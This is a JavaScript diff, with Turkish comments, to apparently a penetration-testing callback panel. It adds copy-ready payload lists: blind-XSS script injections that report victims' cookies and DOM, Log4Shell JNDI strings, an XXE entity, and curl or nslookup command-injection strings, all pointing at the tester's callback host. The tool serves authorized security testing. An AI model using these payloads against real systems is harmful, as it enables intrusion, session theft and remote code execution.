@@ -243,28 +243,31 @@ async function selectHook(token, httpUrl, dnsHost) {
 
   // Blind-XSS payloadları
   const probe = httpUrl + "p.js";
-  const payloads = [
-    ['<script src="' + probe + '"><\/script>', "Temel script etiketi"],
-    ['"><script src="' + probe + '"><\/script>', "Attribute kırma"],
-    ['<img src=x onerror="s=document.createElement(\'script\');s.src=\'' + probe + '\';document.body.appendChild(s)">', "img onerror"],
-  ];
-  const xss = el("details", "urlbox");
-  const xsum = el("summary", "", "🎯 Blind-XSS payloadları");
-  xsum.style.cssText = "cursor:pointer;font-weight:600;list-style:none";
-  xss.appendChild(xsum);
-  xss.appendChild(el("div", "hint",
+  main.appendChild(payloadSection(
+    "🎯 Blind-XSS payloadları",
     "Hedefe enjekte et. Çalışınca kurbanın cookie/URL/DOM'unu geri gönderir; " +
-    "panelde yeni bir istek olarak görünür."));
-  for (const [p, label] of payloads) {
-    xss.appendChild(el("div", "hint", label + ":"));
-    const pr = el("div", "urlrow");
-    pr.appendChild(el("code", "", p));
-    const b = el("button", "", "Kopyala");
-    b.onclick = () => { navigator.clipboard.writeText(p); toast("Kopyalandı"); };
-    pr.appendChild(b);
-    xss.appendChild(pr);
-  }
-  main.appendChild(xss);
+    "panelde yeni bir istek olarak görünür.",
+    [
+      ['<script src="' + probe + '"><\/script>', "Temel script etiketi"],
+      ['"><script src="' + probe + '"><\/script>', "Attribute kırma"],
+      ['<img src=x onerror="s=document.createElement(\'script\');s.src=\'' + probe + '\';document.body.appendChild(s)">', "img onerror"],
+    ]));
+
+  // OOB payload üreticisi (yetkili test için token gömülü dizgeler)
+  const dh = dnsHost || "";
+  main.appendChild(payloadSection(
+    "🧪 OOB payloadları",
+    "Yalnızca yetkili testte. Zafiyetin beklendiği yere koy; tetiklenince " +
+    "panelde yakalanır (çoğu için DNS yakalaması yeterli, çıkış engelliyse de çalışır).",
+    [
+      [httpUrl + "ssrf", "SSRF / blind callback (URL beklenen yere)"],
+      ["${jndi:ldap://" + dh + "/" + SELECTED + "}", "Log4Shell — JNDI LDAP"],
+      ["${jndi:dns://" + dh + "/" + SELECTED + "}", "Log4Shell — JNDI DNS"],
+      ["${jndi:rmi://" + dh + "/" + SELECTED + "}", "Log4Shell — JNDI RMI"],
+      ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "' + httpUrl + 'xxe"> ]><r>&x;</r>', "XXE — OOB callback"],
+      ["; curl " + httpUrl + "ci #", "Komut enjeksiyonu — curl"],
+      ["$(nslookup " + dh + ")", "Komut enjeksiyonu — DNS (çıkış engelliyse)"],
+    ]));
 
   const listWrap = el("div"); listWrap.id = "ixList";
   main.appendChild(listWrap);
@@ -340,6 +343,25 @@ function bodyText(b) {
   if (b === null || b === undefined) return "(boş)";
   if (typeof b === "string") return b;
   try { return JSON.stringify(b, null, 2); } catch { return String(b); }
+}
+
+// Kopyalanabilir payload listesi (katlanır bölüm). items: [[payload, label], ...]
+function payloadSection(title, hint, items) {
+  const d = el("details", "urlbox");
+  const s = el("summary", "", title);
+  s.style.cssText = "cursor:pointer;font-weight:600;list-style:none";
+  d.appendChild(s);
+  d.appendChild(el("div", "hint", hint));
+  for (const [p, label] of items) {
+    d.appendChild(el("div", "hint", label + ":"));
+    const row = el("div", "urlrow");
+    row.appendChild(el("code", "", p));   // textContent — XSS-güvenli
+    const b = el("button", "", "Kopyala");
+    b.onclick = () => { navigator.clipboard.writeText(p); toast("Kopyalandı"); };
+    row.appendChild(b);
+    d.appendChild(row);
+  }
+  return d;
 }
 
 // --- canlı yayın (SSE) ----------------------------------------------
